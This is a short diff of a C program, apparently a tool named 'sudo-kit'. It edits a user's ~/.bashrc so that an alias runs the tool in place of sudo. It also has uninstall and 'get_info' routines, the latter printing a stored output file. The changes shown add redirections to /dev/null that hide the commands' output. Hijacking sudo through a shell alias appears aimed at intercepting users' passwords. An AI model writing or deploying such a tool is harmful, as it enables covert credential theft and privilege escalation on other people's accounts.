@@ -52,7 +52,7 @@ int install(char* install_location){
 	/* Makes an aliase for sudo-kit to be run instead of sudo */
 	if(DEBUG) puts("Installing...");
 	if(DEBUG) puts("Copying...");	
-	system("cp ~/.bashrc ~/.bashrc.bak");
+	system("cp ~/.bashrc ~/.bashrc.bak > /dev/null 2>&1");
 	if(DEBUG) puts("Opening file...");
 	char user[MAX] = {'\0'};
 	get_user(user, MAX);
@@ -79,8 +79,9 @@ int uninstall(){
 	char command[MAX] = {'\0'};
 	strcpy(command, "rm ");
 	strcat(command, OUT_FILE);
+	strcat(command, " > /dev/null 2>&1");
 	system(command);
-	return system("mv ~/.bashrc.bak ~/.bashrc");
+	return system("mv ~/.bashrc.bak ~/.bashrc > /dev/null 2>&1");
 }
 
 void help(){
@@ -108,6 +109,7 @@ int get_info(){
 		while ((c = getc(info)) != EOF)
        			 putchar(c);
 		fclose(info);
+		putchar('\n');
 	} else {
 		if(DEBUG) perror("Error opening file");
 		return 1;
